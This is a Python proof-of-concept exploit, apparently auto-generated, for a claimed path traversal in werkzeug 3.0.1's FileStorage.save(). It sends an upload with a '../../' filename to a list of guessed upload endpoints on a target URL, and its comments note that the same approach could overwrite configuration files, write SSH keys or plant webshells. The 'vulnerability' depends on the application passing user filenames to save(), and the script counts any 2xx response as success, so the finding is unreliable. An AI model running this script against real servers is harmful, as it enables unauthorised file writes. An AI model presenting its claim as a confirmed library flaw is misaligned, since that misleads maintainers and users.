#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: lfi-010
# Sink: save
# Auto-generated — run with: python3 lfi_if_control_dst_save.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for path traversal vulnerability in werkzeug 3.0.1
FileStorage.save() function.

Vulnerability: The save() method accepts a destination path (dst) without any
sanitization or validation. If an attacker can control the dst parameter
(e.g., via a file upload endpoint that passes user-supplied filename to save()),
they can write files to arbitrary locations on the filesystem using path
traversal sequences like '../'.

This PoC demonstrates the vulnerability by writing a benign marker file to
/tmp/poc_success.txt via path traversal. In a real attack, this could be used
to overwrite configuration files, write SSH keys, or plant webshells.

Usage:
    python3 poc.py [--target http://localhost:5000] [--payload ../../tmp/poc_success.txt]
"""

import argparse
import io
import os
import sys
import time
import requests
from urllib.parse import urljoin

def exploit(target_url, payload_path, verbose=False):
    """
    Exploit the path traversal vulnerability in werkzeug's FileStorage.save().
    
    Args:
        target_url: Base URL of the vulnerable application
        payload_path: Path traversal payload (e.g., '../../tmp/poc_success.txt')
        verbose: Enable verbose output
    
    Returns:
        True if exploit appears successful, False otherwise
    """
    
    # Create a simple test file to upload
    # The content will be written to the traversed path
    test_content = b"pwned_by_werkzeug_path_traversal\n"
    
    # Create a file-like object that mimics an uploaded file
    # In a real scenario, this would come from a multipart form upload
    file_data = io.BytesIO(test_content)
    
    # The filename is what gets passed to save() as 'dst'
    # We use path traversal to write outside the intended directory
    files = {
        'file': (payload_path, file_data, 'application/octet-stream')
    }
    
    # Common upload endpoints to try
    upload_endpoints = [
        '/upload',
        '/file/upload',
        '/api/upload',
        '/files/upload',
        '/upload_file',
        '/',
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload path: {payload_path}")
    print(f"[*] Content to write: {test_content.decode().strip()}")
    print()
    
    for endpoint in upload_endpoints:
        upload_url = urljoin(target_url, endpoint)
        print(f"[*] Trying endpoint: {upload_url}")
        
        try:
            # Send the malicious upload request
            response = requests.post(
                upload_url,
                files=files,
                timeout=10,
                allow_redirects=False
            )
            
            if verbose:
                print(f"    Status: {response.status_code}")
                print(f"    Response: {response.text[:200]}")
            
            # Check if the request was accepted (various success indicators)
            if response.status_code in [200, 201, 202, 204]:
                print(f"[+] Upload accepted at {upload_url}")
                print(f"[+] If the application uses werkzeug's save() with our filename,")
                print(f"[+] the file should be written to: {payload_path}")
                print(f"[+] Check for the marker file at the target system")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused - endpoint may not exist")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout - endpoint may be slow or not exist")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    print()
    print("[!] No upload endpoint accepted the request.")
    print("[!] This may mean:")
    print("[!] 1. The application doesn't have a file upload feature")
    print("[!] 2. The upload endpoint uses a different parameter name")
    print("[!] 3. The application validates filenames before passing to save()")
    print()
    print("[*] Try modifying the script to match the actual upload endpoint")
    print("[*] and parameter names used by your target application.")
    
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug 3.0.1 path traversal in FileStorage.save()"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:5000",
        help="Target URL (default: http://localhost:5000)"
    )
    parser.add_argument(
        "--payload",
        default="../../tmp/poc_success.txt",
        help="Path traversal payload (default: ../../tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Werkzeug 3.0.1 Path Traversal PoC")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates the path traversal vulnerability")
    print("[*] in werkzeug's FileStorage.save() method.")
    print("[*] The vulnerability allows writing files to arbitrary locations")
    print("[*] when an attacker controls the destination filename.")
    print()
    
    # Use a benign payload by default - writes a marker file to /tmp
    # In a real attack, this could be used to overwrite critical files
    success = exploit(args.target, args.payload, args.verbose)
    
    if success:
        print()
        print("[+] Exploit attempt completed.")
        print("[+] Verify by checking if the marker file was created on the target.")
        print("[+] For the default payload, check: /tmp/poc_success.txt")
    else:
        print()
        print("[-] Exploit attempt failed or no vulnerable endpoint found.")
        sys.exit(1)

if __name__ == "__main__":
    main()
